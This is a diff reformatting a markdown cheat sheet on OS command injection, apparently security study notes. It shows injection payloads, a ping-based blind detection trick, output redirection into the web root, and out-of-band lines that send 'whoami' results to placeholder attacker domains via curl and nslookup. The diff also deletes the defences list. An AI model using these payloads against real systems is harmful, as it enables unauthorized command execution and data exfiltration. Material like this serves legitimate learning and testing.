@@ -2,23 +2,36 @@
 
 ### Command injection
 
-* `& echo qwerty &`
-  * Placing `&` after the injected command is generally useful because it separates the injected command from whatever follows the injection point
+```sh
+& echo qwerty &
+```
+
+Placing `&` after the injected command is generally useful because it separates the injected command from whatever follows the injection point
 
 ### Blind OS command
 
-* #### Detection
-  * `& ping -c 10 127.0.0.1 &`
-    * 10 sec... time delay
-* #### Exploit
-  1.
-     * Redirecting output -> (you must have write permission)
-     * `& whoami > /var/www/static/whoami.txt &`
-     * `curl https://website.com/whoami.txt`
-  2.
-     * Out-of-band techniques
-     * ``& curl `whoami`.webserver-attacker.com &`` (HTTP traffic may be blocked)
-     * ``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``
+**Detection**
+
+```sh
+# 10 sec. time delay
+& ping -c 10 127.0.0.1 &
+```
+
+**Exploit**
+
+1. Redirecting output. Note: you must have write permission
+
+```sh
+& whoami > /var/www/static/whoami.txt &
+curl https://website.com/whoami.txt
+```
+
+2. Out-of-band techniques
+
+```sh
+& curl `whoami`.webserver-attacker.com & # HTTP traffic may be blocked
+& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+```
 
 ### Bypass restriction
 
@@ -27,20 +40,17 @@
 
 ### Metacharacters
 
-* Windows & Unix
-  * &
-  * &&
-  * |
-  * ||
-* Unix
-  * ;
-* Unix inline execution
-  * \`command\`
-  * $(command)
+```sh
+# Windows & Unix
+&
+&&
+|
+||
 
-### Defences
+# Unix
+;
 
-* Whitelist of permitted values
-* Validating that the input is a number
-* Validating that the input contains only alphanumeric characters, no other syntax or whitespace
-* Never attempt to sanitize input by escaping shell metacharacters
+# Unix inline execution
+`command`
+$(command)
+```
